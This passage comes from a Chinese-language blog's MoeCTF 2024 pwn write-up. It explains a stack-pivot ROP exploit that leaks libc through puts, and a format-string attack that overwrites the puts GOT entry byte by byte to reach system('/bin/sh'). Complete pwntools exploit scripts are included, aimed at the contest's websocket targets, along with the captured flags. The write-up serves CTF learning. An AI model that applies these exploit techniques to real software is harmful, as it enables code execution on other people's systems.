.text:00000000004011FC                 leave</span></span><br><span class="line"><span class="comment"># .text:00000000004011FD                 retn</span></span><br><span class="line">lea_addr_read = <span class="number">0x4011E5</span></span><br><span class="line">leave_ret = <span class="number">0x4011FC</span></span><br><span class="line">call_read_leave_ret = <span class="number">0x4011F6</span></span><br><span class="line">pop_rdi = <span class="number">0x4011C5</span></span><br></pre></td></tr></table></figure>
+<p>我们知道栈迁移是需要连续调用两次<code>leave|ret</code>才能把栈迁到我们想要的地方，但是很明显我们这次就不能只把返回地址覆盖成<code>leave|ret</code>，因为迁过去之后栈是空的。</p>
+<p>我们可以利用上面这个<code>read</code>输入来在迁移之前布栈。</p>
+<p>通过动态调试可以发现<code>_read</code>函数调用前后<code>rsp</code>和<code>rbp</code>是不变的。并且输入地址是以<code>rbp</code>为基准的<code>rbp - 0x80</code>处。也就是说我们可以在迁移之前，利用这段代码，实现布栈。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#   [24] .data             PROGBITS         0000000000404000  00003000</span></span><br><span class="line"><span class="comment">#        0000000000000010  0000000000000000  WA       0     0     8</span></span><br><span class="line"><span class="comment">#   [25] .bss              NOBITS           0000000000404020  00003010</span></span><br><span class="line"><span class="comment">#        0000000000000030  0000000000000000  WA       0     0     32</span></span><br><span class="line">data_seg = <span class="number">0x404000</span> + <span class="number">0x750</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b""</span></span><br><span class="line">payload += <span class="string">b"A"</span> * <span class="number">0x80</span></span><br><span class="line">payload += p64(data_seg + <span class="number">0x80</span>)</span><br><span class="line">payload += p64(lea_addr_read)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b"16 bytes can you kill me?"</span>, payload)</span><br></pre></td></tr></table></figure>
+<p>布栈的代码如下，我们需要去泄露libc的地址，就必须泄露某个函数的地址。很显然虽然调用了上述的布栈手段，但16字节的溢出在迁移之后有效的只有最后的八字节。</p>
+<p>这是明显不够的，所以我们需要二次迁移，在布栈的时候，就将rbp指向的位置覆盖为<code>rbp - 0x80</code>，并将一次迁移之后<code>rsp</code>指向的位置（返回地址）覆盖为<code>leave|ret</code>，实现二次迁移。</p>
+<p>由此，在二次迁移之后，<code>rsp</code>就会顺利指向<code>pop_rdi</code> 。</p>
+<blockquote>
+<p>关于payload最开始8个字节要覆盖为<code>data_seg + 0x80</code>。因为在二次迁移之后，rbp需要是一个附近可读可写的地址，以达到后续调用system时的要求。更重要的，我们这次的输入只是为了泄露libc基址，调用system还需要重新布栈。</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(data_seg + <span class="number">0x80</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(elf.got[<span class="string">"puts"</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">"puts"</span>])</span><br><span class="line">payload += p64(lea_addr_read)</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>, <span class="string">b"A"</span>)</span><br><span class="line">payload += p64(data_seg)</span><br><span class="line">payload += p64(leave_ret)</span><br></pre></td></tr></table></figure>
+<p>泄露<code>libc</code>基址后再次返回read片段，重新布栈：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">p.send(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>))</span><br><span class="line">p.info(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">"puts"</span>]</span><br><span class="line">p.info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.sym[<span class="string">"system"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"/bin/sh\x00"</span></span><br><span class="line">payload += <span class="string">b"A"</span> * <span class="number">0x18</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(data_seg)</span><br><span class="line">payload += p64(system)</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>, <span class="string">b"A"</span>)</span><br><span class="line">payload += p64(data_seg)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
+<p>在调用玩<code>puts.plt</code>之后，rsp指针指向了<code>data_seg + 0x20</code>的位置，在read函数返回之后，rsp指向的还是这个位置。所以真正的rop要从<code>0x20</code>偏移处布置。-</p>
+<p>完整exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> wstube <span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = websocket(<span class="string">"wss://ctf.xidian.edu.cn/api/traffic/7CXomHpSaDlkYQXe2zeZi?port=9999"</span>)</span><br><span class="line"><span class="comment"># p = process("./pwn", env = {"LD_PRELOAD" : "./libc.so.6"})</span></span><br><span class="line">elf = ELF(<span class="string">"./pwn"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"><span class="comment"># .text:00000000004011E5                 lea     rax, [rbp+buf]</span></span><br><span class="line"><span class="comment"># .text:00000000004011E9                 mov     edx, 90h        ; nbytes</span></span><br><span class="line"><span class="comment"># .text:00000000004011EE                 mov     rsi, rax        ; buf</span></span><br><span class="line"><span class="comment"># .text:00000000004011F1                 mov     edi, 0          ; fd</span></span><br><span class="line"><span class="comment"># .text:00000000004011F6                 call    _read</span></span><br><span class="line"><span class="comment"># .text:00000000004011FB                 nop</span></span><br><span class="line"><span class="comment"># .text:00000000004011FC                 leave</span></span><br><span class="line"><span class="comment"># .text:00000000004011FD                 retn</span></span><br><span class="line">lea_addr_read = <span class="number">0x4011E5</span></span><br><span class="line">leave_ret = <span class="number">0x4011FC</span></span><br><span class="line">call_read_leave_ret = <span class="number">0x4011F6</span></span><br><span class="line">pop_rdi = <span class="number">0x4011C5</span></span><br><span class="line"><span class="comment">#   [24] .data             PROGBITS         0000000000404000  00003000</span></span><br><span class="line"><span class="comment">#        0000000000000010  0000000000000000  WA       0     0     8</span></span><br><span class="line"><span class="comment">#   [25] .bss              NOBITS           0000000000404020  00003010</span></span><br><span class="line"><span class="comment">#        0000000000000030  0000000000000000  WA       0     0     32</span></span><br><span class="line">data_seg = <span class="number">0x404000</span> + <span class="number">0x750</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b""</span></span><br><span class="line">payload += <span class="string">b"A"</span> * <span class="number">0x80</span></span><br><span class="line">payload += p64(data_seg + <span class="number">0x80</span>)</span><br><span class="line">payload += p64(lea_addr_read)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b"16 bytes can you kill me?"</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">payload = p64(data_seg + <span class="number">0x80</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(elf.got[<span class="string">"puts"</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">"puts"</span>])</span><br><span class="line">payload += p64(lea_addr_read)</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>, <span class="string">b"A"</span>)</span><br><span class="line">payload += p64(data_seg)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>))</span><br><span class="line">p.info(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">"puts"</span>]</span><br><span class="line">p.info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.sym[<span class="string">"system"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"/bin/sh\x00"</span></span><br><span class="line">payload += <span class="string">b"A"</span> * <span class="number">0x18</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(data_seg)</span><br><span class="line">payload += p64(system)</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>, <span class="string">b"A"</span>)</span><br><span class="line">payload += p64(data_seg)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>flag: <code>moectf{haVe_a_GoOd_tlMe_wH113_TR@V3ling-wiTh-sTaCK!1a}</code></p>
+<h3 id="one-chance">25 One Chance !</h3>
+<p>还没做</p>
+<h3 id="goldenwing">26 Goldenwing</h3>
+<p>好题当赏。</p>
+<p>IDA查看程序，main函数里提供了几个方法</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928122140694.png"></p>
+<p>整个程序的大意就是要和一个boss打架，你有攻击值和生命值，用practice可以提升自己的数值，但只能提升一次。用fight函数可以和boss打架，打赢之后会给你两次fmt的机会。</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928122419658.png"></p>
+<p>同时如果在菜单栏选了<code>-889275714</code>还会给你在栈上布<code>0x20</code>个字节的机会。</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928122456552.png"></p>
+<p>回头看practice函数，可以让你自定义得增加攻击力和生命值，但是有数值限制。</p>
+<p>发现并没有负数检查，所以可以利用负数去加一个很大的数值。</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928122523083.png"></p>
+<p>这道题考察的很全面，综上大体的思路已经有了：</p>
+<ul>
+<li>首先利用<code>practice</code>的负数溢出，去给生命值和攻击力叠满</li>
+<li>之后利用<code>god</code>函数，在栈上布置如下的数据</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload += <span class="string">b"/bin/sh\x00"</span> + p64(elf.got[<span class="string">"puts"</span>]) + p64(elf.got[<span class="string">"puts"</span>] + <span class="number">1</span>) + p64(elf.got[<span class="string">"puts"</span>] + <span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+<p>​ - <code>/bin/sh</code>是最后劫持puts的got去调用system要用到的，后面三个是puts的got表中地址的低三字节地址。</p>
+<ul>
+<li>利用<code>fight</code>函数调用<code>success</code>
+<ul>
+<li>第一次fmt利用<code>%s</code>泄露puts函数地址，从而泄露libc基址，计算system函数地址</li>
+<li>第二次利用逐字节写入的方法，修改puts的got的低三位为system函数的低三位，让他指向system</li>
+<li>之后程序会调用puts函数输出上面这段payload，达到<code>system("/bin/sh")</code>的目的</li>
+</ul></li>
+</ul>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> wstube <span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = websocket(<span class="string">"wss://ctf.xidian.edu.cn/api/traffic/qVhJkFKu1eUit0Av9x06Y?port=9999"</span>)</span><br><span class="line"><span class="comment"># p = process("./pwn", env = {'LD_PRELOAD' : "./libc.so.6"})</span></span><br><span class="line">elf = ELF(<span class="string">"./pwn"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b"Press &lt;ENTER&gt; to continue...\n"</span>, <span class="string">b"\n"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b"Choice&gt; "</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">b"How much hp you want to grow?"</span>, <span class="built_in">str</span>(-<span class="number">11</span>))</span><br><span class="line">p.sendlineafter(<span class="string">b"How much power you want to grow?"</span>, <span class="built_in">str</span>(-<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b"Choice&gt; "</span>, <span class="built_in">str</span>(<span class="number">0xcafebabe</span>))</span><br><span class="line">payload = <span class="string">b""</span></span><br><span class="line">payload += <span class="string">b"/bin/sh\x00"</span> + p64(elf.got[<span class="string">"puts"</span>]) + p64(elf.got[<span class="string">"puts"</span>] + <span class="number">1</span>) + p64(elf.got[<span class="string">"puts"</span>] + <span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b"Maybe you can write some secret code here?"</span>, payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b"Choice&gt; "</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">17</span></span><br><span class="line">payload = <span class="string">b"%17$s"</span></span><br><span class="line">p.sendlineafter(<span class="string">b"You get two magic from Goldenwing, how will you use them?"</span>, payload)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b"\x7f"</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>)) - libc.sym[<span class="string">"puts"</span>]</span><br><span class="line">p.info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">"system"</span>]</span><br><span class="line">p.info(<span class="built_in">hex</span>(system_addr))</span><br><span class="line">p.info(<span class="built_in">hex</span>(libc_base + elf.sym[<span class="string">"puts"</span>]))</span><br><span class="line"><span class="comment"># payload = fmtstr_payload(offset, {elf.got["puts"] : system_addr})</span></span><br><span class="line"></span><br><span class="line">low_1_byte = system_addr &amp; <span class="number">0xff</span></span><br><span class="line">low_2_byte = (system_addr &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">low_3_byte = (system_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x70 0xbd 0x2a</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = <span class="string">"%{}c%17$hhn%{}c%18$hhn%{}c%19$hhn"</span>.<span class="built_in">format</span>(low_1_byte, low_2_byte + (<span class="number">0x100</span> - low_1_byte), low_3_byte + (<span class="number">0x100</span> - low_2_byte))</span><br><span class="line">p.sendlineafter(<span class="string">b"\x0a\x0a"</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>逐字节写入的一个问题在于，如何去在写入后面字节的时候考虑已输出的字符数。</p>
+<p>我们知道利用fmt漏洞去写入地址的时候，写入的数值等于之前输出的字符的个数。</p>
+<p>举个例子，如果在写入第一个字节时，已经输出了<code>0x70</code>的字符，那么在写入第二个字节时（计划写入<code>0xbd</code>）, 只需要写入<code>(0xbd - 0x70)</code>个字节即可。</p>
+<p>但这种方法在后面的字节比前面大，或者计划写入字节数过多的时候显然不通用。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"%{}c%17$hhn%{}c%18$hhn%{}c%19$hhn"</span>.<span class="built_in">format</span>(low_1_byte, low_2_byte + (<span class="number">0x100</span> - low_1_byte), low_3_byte + (<span class="number">0x100</span> - low_2_byte))</span><br></pre></td></tr></table></figure>
+<p>我们这里采用一种方法，由于一个字节最大是<code>0xff</code>，<code>%hhn</code>写入的最大数值就是<code>0xff</code>。所以实际上写入的数值和已经输出的字符个数的关系是<code>n = num_of_char % 0x100</code> 。</p>
+<p><strong>所以我们在写后一个字节时，只需要再加上一个之前字节的反码，将已输出的字符数抵消掉就好啦。</strong></p>
+<blockquote>
+<p>关于逐字节写入：有的时候我们要利用fmt漏洞去写入一个很大的数据。</p>
+<p>如本题所示，常规的思路要将puts的got修改为system，就需要写入六个字节的数据。</p>
+<ul>
+<li>如果不利用逐字节写入，为满足<code>%n</code>的写入需要，前面要输出一大堆的字符，printf的执行时间是非常长的，由于传输时间有限，这种方法在写入大数据时常常达不到预期效果。</li>
+</ul>
+<p>考虑到本题的客观事实，由于puts和system在libc中的偏移地址都在三字节以内，同时我们最多只能在栈上布置三个字节的地址，所以使用逐字节写入的方法，去劫持puts的got表。</p>
+</blockquote>
+<p>flag: <code>moectf{YOU_Re41LY-6e@T-gOId3nWinGeb0f554}</code></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2024/09/30/%E5%A0%86%E5%88%A9%E7%94%A8-WP-01/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          Heap Exploit 01 [Updating~]
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2024/09/06/%E5%A0%86%E5%88%A9%E7%94%A8-01/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Ptmalloc/堆利用备忘笔记</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2024 晚栀wingee~
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+</html>
